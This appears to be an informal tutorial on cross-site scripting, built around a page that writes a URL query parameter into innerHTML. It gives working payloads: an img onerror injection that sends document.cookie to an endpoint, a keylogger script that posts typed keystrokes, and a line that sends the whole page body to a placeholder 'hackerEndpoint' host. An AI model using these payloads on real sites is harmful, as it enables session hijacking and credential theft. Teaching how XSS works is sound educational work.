## Cross Site Script Attack


What is XSS?? Suppose you're on some domain or website saurabh.com and someone from outside inject malicious code to do something unintended then you'll get funcked off that is called Cross site script.

Attacker will get access to a lot of your data like cookies, sessionids or credentials if XSS is successful. 

**Vulnerability:**
1. User session hijacking
2. Unauthorised Activities.
3. Capturing keystrokes.
4. Stealing critical Information.
5. Phishing attack.


#### User session Hacking:
<hr>

Simple Example::(Codes)

```js
<script>
    const param=new URLSearchParams(window.location.search);
    const name=param.get('name');
    document.getElementById('username').innerHTML=name
</script>
```

here we are just picking the query params. we are reading the name from q params. How this leads to the issues then???? Lets check. 
along with the same we'll set some cookies simply. (It set from server but for example we are doin it from frontend)

```js
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1 id="username">Hello</h1>
</body>
<script>
    function setCookies(name, value, ttl){
        const d=new Date();
        d.setTime(d.getTime()+(ttl+24*60));
        const expireon="expires "+ d.toUTCString();
        document.cookie=name+"="+value+"::"+expireon;
    }
    setCookies("Cookie name","vookie values",new Date().getDate());
</script>
<script>
    const param=new URLSearchParams(window.location.search);
    const name=param.get('name');
    document.getElementById('username').innerHTML=name
</script>
</html>
```

Now run it with live server.Now while passing the query params ,manupulate the url.

Passing simple query paramaters.
```js
http://127.0.0.1:5500/index.html?name=%22saurabh%22
```

Manupulating the URL:

```
'?name=<img src="does-not-exist" onerror="var img=document.createElement(\'img\'); img.src=\'http://127.0.0.1:5500/cookie?data=\'+ document.cookie; document.querySelector(\'body\').appendChild(img);">'

```
In previous days you can directly add a script to the query params but the browsers can detect it easily so this using image tag is a hack. If src is not exist in img tag it'll run onerror code...try running this code.
And make sure the URL is encoded:

use: encodeURIComponent is the browers api.

```js
encodeURIComponent('?name=<img src="does-not-exist" onerror="var img=document.createElement(\'img\'); img.src=\'http://127.0.0.1:5500/cookie?data=\'+ document.cookie; document.querySelector(\'body\').appendChild(img);">')
```

then pass it as a query param:

```js
localhost:<port>?<encoded uri given above>
```

What does the above url Conclude lets check it out::

```
var img=document.createElement(\'img\');
img.src=\'http://127.0.0.1:5500/cookie?data=\'+ document.cookie;
document.querySelector(\'body\').appendChild(img);

```
we are passing an image tag, Script tags can't be injected nowadays because browsers are pretty secure and smart. So this hack can be done. If src is "does not exist" it'll call onerror, In a script we are creating a dom node of img and setting src as a url which contail document.cookie which is your cookie (Fucked up).so in that endpoint mentioned after the img.src. the request was rend with the cookie data.


**TEST:**
<img width="900" alt="image" src="https://github.com/SaurabhMulay999/FrontEnd-Design/assets/90036775/2a8c7b94-0b36-4409-ad48-cb874c711d89">

<br>

<img width="714" alt="image" src="https://github.com/SaurabhMulay999/FrontEnd-Design/assets/90036775/5f029073-2a93-470e-bdd2-e3f061205568">

**We had tested as above and yes the script was injecting the image tag and exposing the user cookies as well.**

**Lets check more examples:**

#### Unauthorised Activities:
<hr>

Taking unauth access and doing something on behalf of YOU.

```js
<script>
    function Post(title,description){
        var xhr=new XMLHttpRequest();
        xhr.open("POST",'/post',true);
        console.log(document.cookie);
        xhr.withCredentials=true;
        xhr.setRequestHeader(
            "Content-type",
            "application/x-www-form-urlencoded"
        );
        xhr.send(`txtname=${title} & msg=${description}`);
    }
</script>
```

This will goin to create a post request on your own application and just send the request. how this will create a problem??


```js

<script>
    const param=new URLSearchParams(window.location.search);
    const name=param.get('name');
    document.getElementById('username').innerHTML=name;
</script>

```

suppose from query param above we having. suppose i have written a code or query param in such a way that i'll trigger the method post with some title or some params then it'll again thread to the security.


#### Capturing Keystrokes:
<hr>

If maliciously I passed below script as a query param then that script will execute in back and it'll capture each and every keystroke of user.

```js
<script>
    var timeout;
    var buffer="";
    document.querySelector('body').addEventListener('keypress',
    function(event){
        if(event.which!==0){
            clearTimeout(timeout);
            buffer+=String.fromCharCode(event.which);
            timeout=setTimeout(function(){
                var xhr=new XMLHttpRequest();
                var uri='http://localhost:5500/keys?data='+encodeURIComponent(buffer);
                xhr.open('GET',uri);
                xhr.send();
                buffer= '';
            },400)
        }
    })
</script>
```

and everytime user writing something code script will just pick the keystrokes and make a request to uri with the user input /data as a payload. This will potentially pick your credit card number then password and will be direct threat to your security.

### Stealing Critical information:
<hr>
It'll just copy paste your whole DOM and pass it to the hacker.Just add a script and pass it in the query params.Like example:

```js
Passing in Query Params:

<img src="empty.gif" onerror="var mycookie=document.cookie; new Image().src=`http://hackerEndpoint/fpage.php?output=${document.body.innerHTML}`;">
```
This can just able to copy paste every single information from your DOM and send it to the hacker. same as the phishing attack. hacker will inject the user form, suppose a login form so he'll just take you to the fake login form and you'll put the information and malicious script will send your credentials to the hacker and you'll be fucked up.
